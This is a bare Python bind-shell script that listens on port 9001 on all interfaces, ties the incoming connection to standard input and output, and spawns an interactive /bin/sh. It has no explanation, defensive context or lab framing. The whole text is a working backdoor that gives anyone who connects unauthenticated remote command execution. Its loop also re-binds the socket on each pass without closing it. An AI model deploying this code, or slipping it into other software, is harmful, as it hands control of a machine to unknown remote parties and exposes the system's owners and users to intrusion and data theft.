import socket,os,subprocess

while True:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.bind(("0.0.0.0",9001))
    s.listen(5)
    c,a=s.accept()
    os.dup2(c.fileno(),0)
    os.dup2(c.fileno(),1)
    os.dup2(c.fileno(),2)
    p=subprocess.run(["/bin/sh","-i"])
